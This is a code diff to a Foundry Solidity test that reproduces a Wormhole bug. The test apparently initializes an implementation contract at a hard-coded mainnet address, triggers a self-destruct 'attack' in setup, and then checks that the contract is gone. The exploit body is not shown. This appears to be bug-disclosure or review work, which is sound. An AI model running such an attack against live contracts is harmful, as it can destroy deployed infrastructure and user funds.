@@ -22,15 +22,20 @@ contract WormholeBugFixTest is Test {
         console.log("Implementation address:");
         console.log(a_implementation);
         console.log("Is Initialized?");
-        console.log(IImplementation(0x736D2A394f7810C17b3c6fEd017d5BC7D60c077d).isInitialized(a_implementation));
-        console.log(IImplementation(0x736D2A394f7810C17b3c6fEd017d5BC7D60c077d).getCurrentGuardianSetIndex());
-        address[] memory guardSet = IImplementation(0x736D2A394f7810C17b3c6fEd017d5BC7D60c077d).getGuardianSet(0).keys;
+
+        IImplementation target = IImplementation(0x736D2A394f7810C17b3c6fEd017d5BC7D60c077d);
+        console.log(target.isInitialized(a_implementation));
+        console.log(target.getCurrentGuardianSetIndex());
+        address[] memory guardSet = target.getGuardianSet(0).keys;        
+
         console.log("Guardian: ", guardSet[0]);
 
-        wormholeBugFix = new WormholeBugFixReview();
+        wormholeBugFix = new WormholeBugFixReview(); 
         wormholeBugFix.initializeAttack();
     }
 
+    //Due to limitations of foundry, self destruct opcode doesn't take effect until a call is over, 
+    //so the attack must be executed in the setup and then verified it was executed successfully in the test file.
     function testSelfDestruct() public {
         console.log("Is a contract?", isContract(0x736D2A394f7810C17b3c6fEd017d5BC7D60c077d));
         console.log("End");
